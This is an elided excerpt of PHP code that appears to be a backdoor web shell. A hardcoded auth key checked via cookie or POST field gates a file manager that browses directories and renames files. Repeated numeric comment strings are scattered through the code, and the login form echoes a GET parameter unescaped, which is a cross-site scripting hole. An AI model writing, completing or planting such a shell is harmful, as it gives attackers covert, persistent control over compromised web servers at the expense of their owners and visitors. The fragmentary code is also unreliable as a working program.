...
$auth_key = "40a7da0c19f451397278fd2b79ab1690";
...
$pass = false;
if (isset($_COOKIE['pw_name_21429'])) {
    if(($_COOKIE['pw_name_21429']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_21429'])) {
        if(($_POST['pw_name_21429']) == $auth_key) {
            setcookie("pw_name_21429", $_POST['pw_name_21429']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_21429' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1728278013361475 1728278013303411 1728278013741702 1728278013971506
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1728278013361475 1728278013303411 1728278013741702 1728278013971506
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1728278013361475 1728278013303411 1728278013741702 1728278013971506
            $name = PATH . "/" . $_GET['r'];
